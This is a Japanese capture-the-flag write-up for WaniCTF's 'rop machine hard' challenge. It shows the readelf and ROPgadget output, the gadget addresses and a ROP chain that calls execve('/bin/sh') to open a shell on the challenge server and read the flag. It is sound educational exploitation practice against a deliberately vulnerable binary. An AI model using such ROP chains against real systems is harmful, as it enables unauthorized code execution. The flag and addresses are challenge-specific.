# rop machine hard (232pt Normal)
# 問題文
`nc rop-hard.pwn.wanictf.org 9005`
## ヒント
- ROPgadgetコマンドの使い方を覚えましょう。
- rop machineの使い方->wani-hackase/rop-machine

## 使用ツール例
- netcat (nc)
- ROPgadget

## gccのセキュリティ保護
- Partial RELocation ReadOnly (RELRO)
- Stack Smash Protection (SSP)有効
- No eXecute bit(NX)有効
- Position Independent Executable (PIE)無効
# やったこと

```
 $ nc rop-hard.pwn.wanictf.org 9005

[menu]
1. append hex value
8. show menu (this one)
9. show rop_arena
0. execute rop
> 
```

スタックに命令を追加して最後に実行すれば良いっぽいです．
前の問題にはあった"/bin/sh"のアドレスや，コード片が用意されていません．

問題"rop machine normal"と同じように
問題文から`execve("/bin/sh", 0, 0)`の実行を目指します．

https://www.mztn.org/lxasm64/x86_x64_table.html
等を見ると，
- raxに0x3b (システムコール番号)
- rdiに"/bin/sh" (第一引数)
- rdiに0 (第二引数)
- rdxに0 (第三引数)

を指定した状態でsyscallを実行すれば`execve("/bin/sh", 0, 0)`が実行されるようです．
用意してくれなかったので，以下のアドレスを自分で見つける必要があります．

- "/bin/sh" のアドレス
- "pop rdi; ret" のアドレス
-  "pop rsi; ret" のアドレス
- "pop rdx; ret" のアドレス
- "pop rax; ret" のアドレス
- "syscall; ret" のアドレス

"/bin/sh"のアドレスは
```
$ readelf pwn05 -a | grep binsh
    59: 0000000000404078     8 OBJECT  GLOBAL DEFAULT   25 binsh
```
より0x404078

他のアドレスはROPgadgetを使って探しました．

"pop rsi; ret"はなかったので，"pop rsi ; pop r15 ; ret"を代わりに使って
スタックに入れる数を調節することにしました．

```
$ ROPgadget --binary pwn05 --ropchain | grep pop                       1 ⨯
...
0x00000000004012a9 : pop rax ; ret
0x000000000040128f : pop rdi ; ret
0x000000000040129c : pop rdx ; ret
0x0000000000401611 : pop rsi ; pop r15 ; ret
...

$ ROPgadget --binary pwn05 --ropchain | grep syscall
...
0x00000000004012b6 : syscall
...
```

- "/bin/sh" のアドレス ... 0x404078
- "pop rdi; ret" のアドレス ... 0x40128f
-  "pop rsi; ret" のアドレス ... 0x401611
- "pop rdx; ret" のアドレス ... 0x40129c
- "pop rax; ret" のアドレス ... 0x4012a9
- "syscall; ret" のアドレス ... 04012b6

これで必要なアドレスが集まりました．

次のように設定して実行してみます．

```            
0x00000000004012a9     pop rax; ret
3b
0x000000000040128f      pop rdi ret
0000000000404078          bin/sh
0x0000000000401611     pop rsi; pop r15; ret
0
0
0x000000000040129c      pop rdx; ret
0
0x00000000004012b6      syscall
```

```
nc rop-hard.pwn.wanictf.org 9005                  

[menu]
1. append hex value
8. show menu (this one)
9. show rop_arena
0. execute rop

...

     rop_arena
+--------------------+
| 0x00000000004012a9 |<- rop start
+--------------------+
| 0x000000000000003b |
+--------------------+
| 0x000000000040128f |
+--------------------+
| 0x0000000000404078 |
+--------------------+
| 0x0000000000401611 |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x000000000040129c |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x00000000004012b6 |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{y0ur-next-step-is-to-use-pwntools}
```

実行したらshellが立ち上がりました．

# フラグ
FLAG{y0ur-next-step-is-to-use-pwntools}

# メモ
pwnは超初心者なので間違ってるところがあるかも．